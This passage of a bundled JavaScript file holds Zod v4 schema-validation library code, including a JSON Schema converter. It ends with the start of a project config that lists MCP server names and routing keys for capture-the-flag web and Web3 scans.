    type: "object",
    shape,
    catchall: unknown(),
    ...exports_util.normalizeParams(params)
  });
}
var ZodUnion = /* @__PURE__ */ $constructor("ZodUnion", (inst, def) => {
  $ZodUnion.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => unionProcessor(inst, ctx, json, params);
  inst.options = def.options;
});
function union(options, params) {
  return new ZodUnion({
    type: "union",
    options,
    ...exports_util.normalizeParams(params)
  });
}
var ZodXor = /* @__PURE__ */ $constructor("ZodXor", (inst, def) => {
  ZodUnion.init(inst, def);
  $ZodXor.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => unionProcessor(inst, ctx, json, params);
  inst.options = def.options;
});
function xor(options, params) {
  return new ZodXor({
    type: "union",
    options,
    inclusive: false,
    ...exports_util.normalizeParams(params)
  });
}
var ZodDiscriminatedUnion = /* @__PURE__ */ $constructor("ZodDiscriminatedUnion", (inst, def) => {
  ZodUnion.init(inst, def);
  $ZodDiscriminatedUnion.init(inst, def);
});
function discriminatedUnion(discriminator, options, params) {
  return new ZodDiscriminatedUnion({
    type: "union",
    options,
    discriminator,
    ...exports_util.normalizeParams(params)
  });
}
var ZodIntersection = /* @__PURE__ */ $constructor("ZodIntersection", (inst, def) => {
  $ZodIntersection.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => intersectionProcessor(inst, ctx, json, params);
});
function intersection(left, right) {
  return new ZodIntersection({
    type: "intersection",
    left,
    right
  });
}
var ZodTuple = /* @__PURE__ */ $constructor("ZodTuple", (inst, def) => {
  $ZodTuple.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => tupleProcessor(inst, ctx, json, params);
  inst.rest = (rest) => inst.clone({
    ...inst._zod.def,
    rest
  });
});
function tuple(items, _paramsOrRest, _params) {
  const hasRest = _paramsOrRest instanceof $ZodType;
  const params = hasRest ? _params : _paramsOrRest;
  const rest = hasRest ? _paramsOrRest : null;
  return new ZodTuple({
    type: "tuple",
    items,
    rest,
    ...exports_util.normalizeParams(params)
  });
}
var ZodRecord = /* @__PURE__ */ $constructor("ZodRecord", (inst, def) => {
  $ZodRecord.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => recordProcessor(inst, ctx, json, params);
  inst.keyType = def.keyType;
  inst.valueType = def.valueType;
});
function record(keyType, valueType, params) {
  return new ZodRecord({
    type: "record",
    keyType,
    valueType,
    ...exports_util.normalizeParams(params)
  });
}
function partialRecord(keyType, valueType, params) {
  const k = clone(keyType);
  k._zod.values = undefined;
  return new ZodRecord({
    type: "record",
    keyType: k,
    valueType,
    ...exports_util.normalizeParams(params)
  });
}
function looseRecord(keyType, valueType, params) {
  return new ZodRecord({
    type: "record",
    keyType,
    valueType,
    mode: "loose",
    ...exports_util.normalizeParams(params)
  });
}
var ZodMap = /* @__PURE__ */ $constructor("ZodMap", (inst, def) => {
  $ZodMap.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => mapProcessor(inst, ctx, json, params);
  inst.keyType = def.keyType;
  inst.valueType = def.valueType;
  inst.min = (...args) => inst.check(_minSize(...args));
  inst.nonempty = (params) => inst.check(_minSize(1, params));
  inst.max = (...args) => inst.check(_maxSize(...args));
  inst.size = (...args) => inst.check(_size(...args));
});
function map(keyType, valueType, params) {
  return new ZodMap({
    type: "map",
    keyType,
    valueType,
    ...exports_util.normalizeParams(params)
  });
}
var ZodSet = /* @__PURE__ */ $constructor("ZodSet", (inst, def) => {
  $ZodSet.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => setProcessor(inst, ctx, json, params);
  inst.min = (...args) => inst.check(_minSize(...args));
  inst.nonempty = (params) => inst.check(_minSize(1, params));
  inst.max = (...args) => inst.check(_maxSize(...args));
  inst.size = (...args) => inst.check(_size(...args));
});
function set(valueType, params) {
  return new ZodSet({
    type: "set",
    valueType,
    ...exports_util.normalizeParams(params)
  });
}
var ZodEnum = /* @__PURE__ */ $constructor("ZodEnum", (inst, def) => {
  $ZodEnum.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => enumProcessor(inst, ctx, json, params);
  inst.enum = def.entries;
  inst.options = Object.values(def.entries);
  const keys = new Set(Object.keys(def.entries));
  inst.extract = (values, params) => {
    const newEntries = {};
    for (const value of values) {
      if (keys.has(value)) {
        newEntries[value] = def.entries[value];
      } else
        throw new Error(`Key ${value} not found in enum`);
    }
    return new ZodEnum({
      ...def,
      checks: [],
      ...exports_util.normalizeParams(params),
      entries: newEntries
    });
  };
  inst.exclude = (values, params) => {
    const newEntries = { ...def.entries };
    for (const value of values) {
      if (keys.has(value)) {
        delete newEntries[value];
      } else
        throw new Error(`Key ${value} not found in enum`);
    }
    return new ZodEnum({
      ...def,
      checks: [],
      ...exports_util.normalizeParams(params),
      entries: newEntries
    });
  };
});
function _enum2(values, params) {
  const entries = Array.isArray(values) ? Object.fromEntries(values.map((v) => [v, v])) : values;
  return new ZodEnum({
    type: "enum",
    entries,
    ...exports_util.normalizeParams(params)
  });
}
function nativeEnum(entries, params) {
  return new ZodEnum({
    type: "enum",
    entries,
    ...exports_util.normalizeParams(params)
  });
}
var ZodLiteral = /* @__PURE__ */ $constructor("ZodLiteral", (inst, def) => {
  $ZodLiteral.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => literalProcessor(inst, ctx, json, params);
  inst.values = new Set(def.values);
  Object.defineProperty(inst, "value", {
    get() {
      if (def.values.length > 1) {
        throw new Error("This schema contains multiple valid literal values. Use `.values` instead.");
      }
      return def.values[0];
    }
  });
});
function literal(value, params) {
  return new ZodLiteral({
    type: "literal",
    values: Array.isArray(value) ? value : [value],
    ...exports_util.normalizeParams(params)
  });
}
var ZodFile = /* @__PURE__ */ $constructor("ZodFile", (inst, def) => {
  $ZodFile.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => fileProcessor(inst, ctx, json, params);
  inst.min = (size, params) => inst.check(_minSize(size, params));
  inst.max = (size, params) => inst.check(_maxSize(size, params));
  inst.mime = (types, params) => inst.check(_mime(Array.isArray(types) ? types : [types], params));
});
function file(params) {
  return _file(ZodFile, params);
}
var ZodTransform = /* @__PURE__ */ $constructor("ZodTransform", (inst, def) => {
  $ZodTransform.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => transformProcessor(inst, ctx, json, params);
  inst._zod.parse = (payload, _ctx) => {
    if (_ctx.direction === "backward") {
      throw new $ZodEncodeError(inst.constructor.name);
    }
    payload.addIssue = (issue2) => {
      if (typeof issue2 === "string") {
        payload.issues.push(exports_util.issue(issue2, payload.value, def));
      } else {
        const _issue = issue2;
        if (_issue.fatal)
          _issue.continue = false;
        _issue.code ?? (_issue.code = "custom");
        _issue.input ?? (_issue.input = payload.value);
        _issue.inst ?? (_issue.inst = inst);
        payload.issues.push(exports_util.issue(_issue));
      }
    };
    const output = def.transform(payload.value, payload);
    if (output instanceof Promise) {
      return output.then((output2) => {
        payload.value = output2;
        return payload;
      });
    }
    payload.value = output;
    return payload;
  };
});
function transform(fn) {
  return new ZodTransform({
    type: "transform",
    transform: fn
  });
}
var ZodOptional = /* @__PURE__ */ $constructor("ZodOptional", (inst, def) => {
  $ZodOptional.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => optionalProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
});
function optional(innerType) {
  return new ZodOptional({
    type: "optional",
    innerType
  });
}
var ZodExactOptional = /* @__PURE__ */ $constructor("ZodExactOptional", (inst, def) => {
  $ZodExactOptional.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => optionalProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
});
function exactOptional(innerType) {
  return new ZodExactOptional({
    type: "optional",
    innerType
  });
}
var ZodNullable = /* @__PURE__ */ $constructor("ZodNullable", (inst, def) => {
  $ZodNullable.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => nullableProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
});
function nullable(innerType) {
  return new ZodNullable({
    type: "nullable",
    innerType
  });
}
function nullish2(innerType) {
  return optional(nullable(innerType));
}
var ZodDefault = /* @__PURE__ */ $constructor("ZodDefault", (inst, def) => {
  $ZodDefault.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => defaultProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
  inst.removeDefault = inst.unwrap;
});
function _default2(innerType, defaultValue) {
  return new ZodDefault({
    type: "default",
    innerType,
    get defaultValue() {
      return typeof defaultValue === "function" ? defaultValue() : exports_util.shallowClone(defaultValue);
    }
  });
}
var ZodPrefault = /* @__PURE__ */ $constructor("ZodPrefault", (inst, def) => {
  $ZodPrefault.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => prefaultProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
});
function prefault(innerType, defaultValue) {
  return new ZodPrefault({
    type: "prefault",
    innerType,
    get defaultValue() {
      return typeof defaultValue === "function" ? defaultValue() : exports_util.shallowClone(defaultValue);
    }
  });
}
var ZodNonOptional = /* @__PURE__ */ $constructor("ZodNonOptional", (inst, def) => {
  $ZodNonOptional.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => nonoptionalProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
});
function nonoptional(innerType, params) {
  return new ZodNonOptional({
    type: "nonoptional",
    innerType,
    ...exports_util.normalizeParams(params)
  });
}
var ZodSuccess = /* @__PURE__ */ $constructor("ZodSuccess", (inst, def) => {
  $ZodSuccess.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => successProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
});
function success(innerType) {
  return new ZodSuccess({
    type: "success",
    innerType
  });
}
var ZodCatch = /* @__PURE__ */ $constructor("ZodCatch", (inst, def) => {
  $ZodCatch.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => catchProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
  inst.removeCatch = inst.unwrap;
});
function _catch2(innerType, catchValue) {
  return new ZodCatch({
    type: "catch",
    innerType,
    catchValue: typeof catchValue === "function" ? catchValue : () => catchValue
  });
}
var ZodNaN = /* @__PURE__ */ $constructor("ZodNaN", (inst, def) => {
  $ZodNaN.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => nanProcessor(inst, ctx, json, params);
});
function nan(params) {
  return _nan(ZodNaN, params);
}
var ZodPipe = /* @__PURE__ */ $constructor("ZodPipe", (inst, def) => {
  $ZodPipe.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => pipeProcessor(inst, ctx, json, params);
  inst.in = def.in;
  inst.out = def.out;
});
function pipe(in_, out) {
  return new ZodPipe({
    type: "pipe",
    in: in_,
    out
  });
}
var ZodCodec = /* @__PURE__ */ $constructor("ZodCodec", (inst, def) => {
  ZodPipe.init(inst, def);
  $ZodCodec.init(inst, def);
});
function codec(in_, out, params) {
  return new ZodCodec({
    type: "pipe",
    in: in_,
    out,
    transform: params.decode,
    reverseTransform: params.encode
  });
}
var ZodReadonly = /* @__PURE__ */ $constructor("ZodReadonly", (inst, def) => {
  $ZodReadonly.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => readonlyProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
});
function readonly(innerType) {
  return new ZodReadonly({
    type: "readonly",
    innerType
  });
}
var ZodTemplateLiteral = /* @__PURE__ */ $constructor("ZodTemplateLiteral", (inst, def) => {
  $ZodTemplateLiteral.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => templateLiteralProcessor(inst, ctx, json, params);
});
function templateLiteral(parts, params) {
  return new ZodTemplateLiteral({
    type: "template_literal",
    parts,
    ...exports_util.normalizeParams(params)
  });
}
var ZodLazy = /* @__PURE__ */ $constructor("ZodLazy", (inst, def) => {
  $ZodLazy.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => lazyProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.getter();
});
function lazy(getter) {
  return new ZodLazy({
    type: "lazy",
    getter
  });
}
var ZodPromise = /* @__PURE__ */ $constructor("ZodPromise", (inst, def) => {
  $ZodPromise.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => promiseProcessor(inst, ctx, json, params);
  inst.unwrap = () => inst._zod.def.innerType;
});
function promise(innerType) {
  return new ZodPromise({
    type: "promise",
    innerType
  });
}
var ZodFunction = /* @__PURE__ */ $constructor("ZodFunction", (inst, def) => {
  $ZodFunction.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => functionProcessor(inst, ctx, json, params);
});
function _function(params) {
  return new ZodFunction({
    type: "function",
    input: Array.isArray(params?.input) ? tuple(params?.input) : params?.input ?? array(unknown()),
    output: params?.output ?? unknown()
  });
}
var ZodCustom = /* @__PURE__ */ $constructor("ZodCustom", (inst, def) => {
  $ZodCustom.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => customProcessor(inst, ctx, json, params);
});
function check(fn) {
  const ch = new $ZodCheck({
    check: "custom"
  });
  ch._zod.check = fn;
  return ch;
}
function custom(fn, _params) {
  return _custom(ZodCustom, fn ?? (() => true), _params);
}
function refine(fn, _params = {}) {
  return _refine(ZodCustom, fn, _params);
}
function superRefine(fn) {
  return _superRefine(fn);
}
var describe2 = describe;
var meta2 = meta;
function _instanceof(cls, params = {}) {
  const inst = new ZodCustom({
    type: "custom",
    check: "custom",
    fn: (data) => data instanceof cls,
    abort: true,
    ...exports_util.normalizeParams(params)
  });
  inst._zod.bag.Class = cls;
  inst._zod.check = (payload) => {
    if (!(payload.value instanceof cls)) {
      payload.issues.push({
        code: "invalid_type",
        expected: cls.name,
        input: payload.value,
        inst,
        path: [...inst._zod.def.path ?? []]
      });
    }
  };
  return inst;
}
var stringbool = (...args) => _stringbool({
  Codec: ZodCodec,
  Boolean: ZodBoolean,
  String: ZodString
}, ...args);
function json(params) {
  const jsonSchema = lazy(() => {
    return union([string2(params), number2(), boolean2(), _null3(), array(jsonSchema), record(string2(), jsonSchema)]);
  });
  return jsonSchema;
}
function preprocess(fn, schema) {
  return pipe(transform(fn), schema);
}
// node_modules/zod/v4/classic/compat.js
var ZodIssueCode = {
  invalid_type: "invalid_type",
  too_big: "too_big",
  too_small: "too_small",
  invalid_format: "invalid_format",
  not_multiple_of: "not_multiple_of",
  unrecognized_keys: "unrecognized_keys",
  invalid_union: "invalid_union",
  invalid_key: "invalid_key",
  invalid_element: "invalid_element",
  invalid_value: "invalid_value",
  custom: "custom"
};
function setErrorMap(map2) {
  config({
    customError: map2
  });
}
function getErrorMap() {
  return config().customError;
}
var ZodFirstPartyTypeKind;
(function(ZodFirstPartyTypeKind2) {})(ZodFirstPartyTypeKind || (ZodFirstPartyTypeKind = {}));
// node_modules/zod/v4/classic/from-json-schema.js
var z = {
  ...exports_schemas2,
  ...exports_checks2,
  iso: exports_iso
};
var RECOGNIZED_KEYS = new Set([
  "$schema",
  "$ref",
  "$defs",
  "definitions",
  "$id",
  "id",
  "$comment",
  "$anchor",
  "$vocabulary",
  "$dynamicRef",
  "$dynamicAnchor",
  "type",
  "enum",
  "const",
  "anyOf",
  "oneOf",
  "allOf",
  "not",
  "properties",
  "required",
  "additionalProperties",
  "patternProperties",
  "propertyNames",
  "minProperties",
  "maxProperties",
  "items",
  "prefixItems",
  "additionalItems",
  "minItems",
  "maxItems",
  "uniqueItems",
  "contains",
  "minContains",
  "maxContains",
  "minLength",
  "maxLength",
  "pattern",
  "format",
  "minimum",
  "maximum",
  "exclusiveMinimum",
  "exclusiveMaximum",
  "multipleOf",
  "description",
  "default",
  "contentEncoding",
  "contentMediaType",
  "contentSchema",
  "unevaluatedItems",
  "unevaluatedProperties",
  "if",
  "then",
  "else",
  "dependentSchemas",
  "dependentRequired",
  "nullable",
  "readOnly"
]);
function detectVersion(schema, defaultTarget) {
  const $schema = schema.$schema;
  if ($schema === "https://json-schema.org/draft/2020-12/schema") {
    return "draft-2020-12";
  }
  if ($schema === "http://json-schema.org/draft-07/schema#") {
    return "draft-7";
  }
  if ($schema === "http://json-schema.org/draft-04/schema#") {
    return "draft-4";
  }
  return defaultTarget ?? "draft-2020-12";
}
function resolveRef(ref, ctx) {
  if (!ref.startsWith("#")) {
    throw new Error("External $ref is not supported, only local refs (#/...) are allowed");
  }
  const path = ref.slice(1).split("/").filter(Boolean);
  if (path.length === 0) {
    return ctx.rootSchema;
  }
  const defsKey = ctx.version === "draft-2020-12" ? "$defs" : "definitions";
  if (path[0] === defsKey) {
    const key = path[1];
    if (!key || !ctx.defs[key]) {
      throw new Error(`Reference not found: ${ref}`);
    }
    return ctx.defs[key];
  }
  throw new Error(`Reference not found: ${ref}`);
}
function convertBaseSchema(schema, ctx) {
  if (schema.not !== undefined) {
    if (typeof schema.not === "object" && Object.keys(schema.not).length === 0) {
      return z.never();
    }
    throw new Error("not is not supported in Zod (except { not: {} } for never)");
  }
  if (schema.unevaluatedItems !== undefined) {
    throw new Error("unevaluatedItems is not supported");
  }
  if (schema.unevaluatedProperties !== undefined) {
    throw new Error("unevaluatedProperties is not supported");
  }
  if (schema.if !== undefined || schema.then !== undefined || schema.else !== undefined) {
    throw new Error("Conditional schemas (if/then/else) are not supported");
  }
  if (schema.dependentSchemas !== undefined || schema.dependentRequired !== undefined) {
    throw new Error("dependentSchemas and dependentRequired are not supported");
  }
  if (schema.$ref) {
    const refPath = schema.$ref;
    if (ctx.refs.has(refPath)) {
      return ctx.refs.get(refPath);
    }
    if (ctx.processing.has(refPath)) {
      return z.lazy(() => {
        if (!ctx.refs.has(refPath)) {
          throw new Error(`Circular reference not resolved: ${refPath}`);
        }
        return ctx.refs.get(refPath);
      });
    }
    ctx.processing.add(refPath);
    const resolved = resolveRef(refPath, ctx);
    const zodSchema2 = convertSchema(resolved, ctx);
    ctx.refs.set(refPath, zodSchema2);
    ctx.processing.delete(refPath);
    return zodSchema2;
  }
  if (schema.enum !== undefined) {
    const enumValues = schema.enum;
    if (ctx.version === "openapi-3.0" && schema.nullable === true && enumValues.length === 1 && enumValues[0] === null) {
      return z.null();
    }
    if (enumValues.length === 0) {
      return z.never();
    }
    if (enumValues.length === 1) {
      return z.literal(enumValues[0]);
    }
    if (enumValues.every((v) => typeof v === "string")) {
      return z.enum(enumValues);
    }
    const literalSchemas = enumValues.map((v) => z.literal(v));
    if (literalSchemas.length < 2) {
      return literalSchemas[0];
    }
    return z.union([literalSchemas[0], literalSchemas[1], ...literalSchemas.slice(2)]);
  }
  if (schema.const !== undefined) {
    return z.literal(schema.const);
  }
  const type = schema.type;
  if (Array.isArray(type)) {
    const typeSchemas = type.map((t) => {
      const typeSchema = { ...schema, type: t };
      return convertBaseSchema(typeSchema, ctx);
    });
    if (typeSchemas.length === 0) {
      return z.never();
    }
    if (typeSchemas.length === 1) {
      return typeSchemas[0];
    }
    return z.union(typeSchemas);
  }
  if (!type) {
    return z.any();
  }
  let zodSchema;
  switch (type) {
    case "string": {
      let stringSchema = z.string();
      if (schema.format) {
        const format = schema.format;
        if (format === "email") {
          stringSchema = stringSchema.check(z.email());
        } else if (format === "uri" || format === "uri-reference") {
          stringSchema = stringSchema.check(z.url());
        } else if (format === "uuid" || format === "guid") {
          stringSchema = stringSchema.check(z.uuid());
        } else if (format === "date-time") {
          stringSchema = stringSchema.check(z.iso.datetime());
        } else if (format === "date") {
          stringSchema = stringSchema.check(z.iso.date());
        } else if (format === "time") {
          stringSchema = stringSchema.check(z.iso.time());
        } else if (format === "duration") {
          stringSchema = stringSchema.check(z.iso.duration());
        } else if (format === "ipv4") {
          stringSchema = stringSchema.check(z.ipv4());
        } else if (format === "ipv6") {
          stringSchema = stringSchema.check(z.ipv6());
        } else if (format === "mac") {
          stringSchema = stringSchema.check(z.mac());
        } else if (format === "cidr") {
          stringSchema = stringSchema.check(z.cidrv4());
        } else if (format === "cidr-v6") {
          stringSchema = stringSchema.check(z.cidrv6());
        } else if (format === "base64") {
          stringSchema = stringSchema.check(z.base64());
        } else if (format === "base64url") {
          stringSchema = stringSchema.check(z.base64url());
        } else if (format === "e164") {
          stringSchema = stringSchema.check(z.e164());
        } else if (format === "jwt") {
          stringSchema = stringSchema.check(z.jwt());
        } else if (format === "emoji") {
          stringSchema = stringSchema.check(z.emoji());
        } else if (format === "nanoid") {
          stringSchema = stringSchema.check(z.nanoid());
        } else if (format === "cuid") {
          stringSchema = stringSchema.check(z.cuid());
        } else if (format === "cuid2") {
          stringSchema = stringSchema.check(z.cuid2());
        } else if (format === "ulid") {
          stringSchema = stringSchema.check(z.ulid());
        } else if (format === "xid") {
          stringSchema = stringSchema.check(z.xid());
        } else if (format === "ksuid") {
          stringSchema = stringSchema.check(z.ksuid());
        }
      }
      if (typeof schema.minLength === "number") {
        stringSchema = stringSchema.min(schema.minLength);
      }
      if (typeof schema.maxLength === "number") {
        stringSchema = stringSchema.max(schema.maxLength);
      }
      if (schema.pattern) {
        stringSchema = stringSchema.regex(new RegExp(schema.pattern));
      }
      zodSchema = stringSchema;
      break;
    }
    case "number":
    case "integer": {
      let numberSchema = type === "integer" ? z.number().int() : z.number();
      if (typeof schema.minimum === "number") {
        numberSchema = numberSchema.min(schema.minimum);
      }
      if (typeof schema.maximum === "number") {
        numberSchema = numberSchema.max(schema.maximum);
      }
      if (typeof schema.exclusiveMinimum === "number") {
        numberSchema = numberSchema.gt(schema.exclusiveMinimum);
      } else if (schema.exclusiveMinimum === true && typeof schema.minimum === "number") {
        numberSchema = numberSchema.gt(schema.minimum);
      }
      if (typeof schema.exclusiveMaximum === "number") {
        numberSchema = numberSchema.lt(schema.exclusiveMaximum);
      } else if (schema.exclusiveMaximum === true && typeof schema.maximum === "number") {
        numberSchema = numberSchema.lt(schema.maximum);
      }
      if (typeof schema.multipleOf === "number") {
        numberSchema = numberSchema.multipleOf(schema.multipleOf);
      }
      zodSchema = numberSchema;
      break;
    }
    case "boolean": {
      zodSchema = z.boolean();
      break;
    }
    case "null": {
      zodSchema = z.null();
      break;
    }
    case "object": {
      const shape = {};
      const properties = schema.properties || {};
      const requiredSet = new Set(schema.required || []);
      for (const [key, propSchema] of Object.entries(properties)) {
        const propZodSchema = convertSchema(propSchema, ctx);
        shape[key] = requiredSet.has(key) ? propZodSchema : propZodSchema.optional();
      }
      if (schema.propertyNames) {
        const keySchema = convertSchema(schema.propertyNames, ctx);
        const valueSchema = schema.additionalProperties && typeof schema.additionalProperties === "object" ? convertSchema(schema.additionalProperties, ctx) : z.any();
        if (Object.keys(shape).length === 0) {
          zodSchema = z.record(keySchema, valueSchema);
          break;
        }
        const objectSchema2 = z.object(shape).passthrough();
        const recordSchema = z.looseRecord(keySchema, valueSchema);
        zodSchema = z.intersection(objectSchema2, recordSchema);
        break;
      }
      if (schema.patternProperties) {
        const patternProps = schema.patternProperties;
        const patternKeys = Object.keys(patternProps);
        const looseRecords = [];
        for (const pattern of patternKeys) {
          const patternValue = convertSchema(patternProps[pattern], ctx);
          const keySchema = z.string().regex(new RegExp(pattern));
          looseRecords.push(z.looseRecord(keySchema, patternValue));
        }
        const schemasToIntersect = [];
        if (Object.keys(shape).length > 0) {
          schemasToIntersect.push(z.object(shape).passthrough());
        }
        schemasToIntersect.push(...looseRecords);
        if (schemasToIntersect.length === 0) {
          zodSchema = z.object({}).passthrough();
        } else if (schemasToIntersect.length === 1) {
          zodSchema = schemasToIntersect[0];
        } else {
          let result = z.intersection(schemasToIntersect[0], schemasToIntersect[1]);
          for (let i = 2;i < schemasToIntersect.length; i++) {
            result = z.intersection(result, schemasToIntersect[i]);
          }
          zodSchema = result;
        }
        break;
      }
      const objectSchema = z.object(shape);
      if (schema.additionalProperties === false) {
        zodSchema = objectSchema.strict();
      } else if (typeof schema.additionalProperties === "object") {
        zodSchema = objectSchema.catchall(convertSchema(schema.additionalProperties, ctx));
      } else {
        zodSchema = objectSchema.passthrough();
      }
      break;
    }
    case "array": {
      const prefixItems = schema.prefixItems;
      const items = schema.items;
      if (prefixItems && Array.isArray(prefixItems)) {
        const tupleItems = prefixItems.map((item) => convertSchema(item, ctx));
        const rest = items && typeof items === "object" && !Array.isArray(items) ? convertSchema(items, ctx) : undefined;
        if (rest) {
          zodSchema = z.tuple(tupleItems).rest(rest);
        } else {
          zodSchema = z.tuple(tupleItems);
        }
        if (typeof schema.minItems === "number") {
          zodSchema = zodSchema.check(z.minLength(schema.minItems));
        }
        if (typeof schema.maxItems === "number") {
          zodSchema = zodSchema.check(z.maxLength(schema.maxItems));
        }
      } else if (Array.isArray(items)) {
        const tupleItems = items.map((item) => convertSchema(item, ctx));
        const rest = schema.additionalItems && typeof schema.additionalItems === "object" ? convertSchema(schema.additionalItems, ctx) : undefined;
        if (rest) {
          zodSchema = z.tuple(tupleItems).rest(rest);
        } else {
          zodSchema = z.tuple(tupleItems);
        }
        if (typeof schema.minItems === "number") {
          zodSchema = zodSchema.check(z.minLength(schema.minItems));
        }
        if (typeof schema.maxItems === "number") {
          zodSchema = zodSchema.check(z.maxLength(schema.maxItems));
        }
      } else if (items !== undefined) {
        const element = convertSchema(items, ctx);
        let arraySchema = z.array(element);
        if (typeof schema.minItems === "number") {
          arraySchema = arraySchema.min(schema.minItems);
        }
        if (typeof schema.maxItems === "number") {
          arraySchema = arraySchema.max(schema.maxItems);
        }
        zodSchema = arraySchema;
      } else {
        zodSchema = z.array(z.any());
      }
      break;
    }
    default:
      throw new Error(`Unsupported type: ${type}`);
  }
  if (schema.description) {
    zodSchema = zodSchema.describe(schema.description);
  }
  if (schema.default !== undefined) {
    zodSchema = zodSchema.default(schema.default);
  }
  return zodSchema;
}
function convertSchema(schema, ctx) {
  if (typeof schema === "boolean") {
    return schema ? z.any() : z.never();
  }
  let baseSchema = convertBaseSchema(schema, ctx);
  const hasExplicitType = schema.type || schema.enum !== undefined || schema.const !== undefined;
  if (schema.anyOf && Array.isArray(schema.anyOf)) {
    const options = schema.anyOf.map((s) => convertSchema(s, ctx));
    const anyOfUnion = z.union(options);
    baseSchema = hasExplicitType ? z.intersection(baseSchema, anyOfUnion) : anyOfUnion;
  }
  if (schema.oneOf && Array.isArray(schema.oneOf)) {
    const options = schema.oneOf.map((s) => convertSchema(s, ctx));
    const oneOfUnion = z.xor(options);
    baseSchema = hasExplicitType ? z.intersection(baseSchema, oneOfUnion) : oneOfUnion;
  }
  if (schema.allOf && Array.isArray(schema.allOf)) {
    if (schema.allOf.length === 0) {
      baseSchema = hasExplicitType ? baseSchema : z.any();
    } else {
      let result = hasExplicitType ? baseSchema : convertSchema(schema.allOf[0], ctx);
      const startIdx = hasExplicitType ? 0 : 1;
      for (let i = startIdx;i < schema.allOf.length; i++) {
        result = z.intersection(result, convertSchema(schema.allOf[i], ctx));
      }
      baseSchema = result;
    }
  }
  if (schema.nullable === true && ctx.version === "openapi-3.0") {
    baseSchema = z.nullable(baseSchema);
  }
  if (schema.readOnly === true) {
    baseSchema = z.readonly(baseSchema);
  }
  const extraMeta = {};
  const coreMetadataKeys = ["$id", "id", "$comment", "$anchor", "$vocabulary", "$dynamicRef", "$dynamicAnchor"];
  for (const key of coreMetadataKeys) {
    if (key in schema) {
      extraMeta[key] = schema[key];
    }
  }
  const contentMetadataKeys = ["contentEncoding", "contentMediaType", "contentSchema"];
  for (const key of contentMetadataKeys) {
    if (key in schema) {
      extraMeta[key] = schema[key];
    }
  }
  for (const key of Object.keys(schema)) {
    if (!RECOGNIZED_KEYS.has(key)) {
      extraMeta[key] = schema[key];
    }
  }
  if (Object.keys(extraMeta).length > 0) {
    ctx.registry.add(baseSchema, extraMeta);
  }
  return baseSchema;
}
function fromJSONSchema(schema, params) {
  if (typeof schema === "boolean") {
    return schema ? z.any() : z.never();
  }
  const version2 = detectVersion(schema, params?.defaultTarget);
  const defs = schema.$defs || schema.definitions || {};
  const ctx = {
    version: version2,
    defs,
    refs: new Map,
    processing: new Set,
    rootSchema: schema,
    registry: params?.registry ?? globalRegistry
  };
  return convertSchema(schema, ctx);
}
// node_modules/zod/v4/classic/coerce.js
var exports_coerce = {};
__export(exports_coerce, {
  string: () => string3,
  number: () => number3,
  date: () => date4,
  boolean: () => boolean3,
  bigint: () => bigint3
});
function string3(params) {
  return _coercedString(ZodString, params);
}
function number3(params) {
  return _coercedNumber(ZodNumber, params);
}
function boolean3(params) {
  return _coercedBoolean(ZodBoolean, params);
}
function bigint3(params) {
  return _coercedBigint(ZodBigInt, params);
}
function date4(params) {
  return _coercedDate(ZodDate, params);
}

// node_modules/zod/v4/classic/external.js
config(en_default());
// src/mcp/types.ts
var BuiltinMcpNameSchema = exports_external.enum(["context7", "grep_app", "websearch", "memory", "sequential_thinking"]);
var AnyMcpNameSchema = exports_external.string().min(1);

// src/config/schema.ts
var DEFAULT_ROUTING = {
  ctf: {
    scan: {
      WEB_API: "ctf-web",
      WEB3: "ctf-web3",
